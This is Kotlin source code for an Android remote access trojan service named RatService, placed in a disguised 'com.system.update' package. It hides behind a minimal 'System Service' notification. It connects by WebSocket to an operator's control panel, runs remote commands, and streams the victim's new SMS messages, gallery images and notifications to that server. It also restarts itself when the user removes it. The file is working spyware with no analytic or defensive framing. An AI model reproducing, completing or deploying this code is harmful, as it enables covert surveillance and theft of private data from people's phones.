package com.system.update

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.JsonObject
import okhttp3.*
import java.util.concurrent.TimeUnit

class RatService : Service() {

    companion object {
        const val NOTIF_ID = 1

        @Volatile var instance: RatService? = null
    }

    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .pingInterval(20, TimeUnit.SECONDS)
        .connectTimeout(15, TimeUnit.SECONDS)
        .build()

    private var ws: WebSocket? = null
    private val gson = Gson()
    private var deviceId: String = ""
    private var running = true
    private lateinit var handler: CommandHandler
    private var smsWatcher: SmsWatcher? = null
    private var galleryWatcher: GalleryWatcher? = null
    private var reconnectAttempts = 0

    override fun onCreate() {
        super.onCreate()
        instance = this
        deviceId = android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown"
        handler = CommandHandler(this, deviceId)

        smsWatcher = SmsWatcher(this) { sms ->
            sendEvent(mapOf("type" to "sms_new", "data" to sms))
        }
        galleryWatcher = GalleryWatcher(this) { img ->
            sendEvent(mapOf("type" to "gallery_new", "data" to img))
        }

        // Register notification listener callback
        NotificationListener.callback = { data ->
            sendNotificationEvent(data)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIF_ID, buildNotification())
        if (ws == null) {
            connect()
            startHeartbeat()
        }
        try { smsWatcher?.start() } catch (_: Exception) {}
        try { galleryWatcher?.start() } catch (_: Exception) {}
        return START_STICKY
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, App.CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun connect() {
        val cfg = App.config
        val url = "${cfg.panelUrl}?deviceId=$deviceId&owner=${cfg.username}"
        val req = Request.Builder().url(url).build()

        ws = client.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                reconnectAttempts = 0
                sendInfo(webSocket)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val obj = gson.fromJson(text, JsonObject::class.java)
                    if (obj.get("type")?.asString == "command") {
                        val id = obj.get("id").asLong
                        val cmd = obj.get("command").asString
                        val args = obj.getAsJsonObject("args")
                        handler.execute(cmd, args) { result ->
                            val payload = JsonObject().apply {
                                addProperty("type", "result")
                                addProperty("commandId", id)
                                add("result", gson.toJsonTree(result))
                            }
                            try { webSocket.send(gson.toJson(payload)) } catch (_: Exception) {}
                        }
                    }
                } catch (_: Exception) {}
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                if (running) scheduleReconnect()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                if (running) scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        val delay = minOf(30000L, 2000L * (reconnectAttempts + 1))
        reconnectAttempts++
        Thread {
            try { Thread.sleep(delay) } catch (_: Exception) {}
            if (running) {
                try { connect() } catch (_: Exception) {}
            }
        }.start()
    }

    private fun sendEvent(data: Map<String, Any>) {
        try {
            val payload = JsonObject().apply {
                addProperty("type", "event")
                add("data", gson.toJsonTree(data))
            }
            ws?.send(gson.toJson(payload))
        } catch (_: Exception) {}
    }

    fun sendNotificationEvent(data: Map<String, String>) {
        try {
            val payload = JsonObject().apply {
                addProperty("type", "event")
                add("data", gson.toJsonTree(mapOf(
                    "type" to "notif_new",
                    "data" to data
                )))
            }
            ws?.send(gson.toJson(payload))
        } catch (_: Exception) {}
    }

    private fun sendInfo(socket: WebSocket) {
        try {
            val payload = JsonObject().apply {
                addProperty("type", "info")
                add("info", gson.toJsonTree(handler.collectInfo()))
            }
            socket.send(gson.toJson(payload))
        } catch (_: Exception) {}
    }

    private fun startHeartbeat() {
        Thread {
            while (running) {
                try {
                    ws?.send(gson.toJson(mapOf("type" to "heartbeat")))
                    Thread.sleep(App.config.heartbeatMs)
                } catch (_: Exception) {}
            }
        }.start()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            val restart = Intent(applicationContext, RatService::class.java)
            val pi = PendingIntent.getService(
                this, 2, restart,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            am.set(AlarmManager.RTC, System.currentTimeMillis() + 1000, pi)
        } catch (_: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        running = false
        try { smsWatcher?.stop() } catch (_: Exception) {}
        try { galleryWatcher?.stop() } catch (_: Exception) {}
        try { ws?.close(1000, "stop") } catch (_: Exception) {}
        NotificationListener.callback = null
        if (instance === this) instance = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
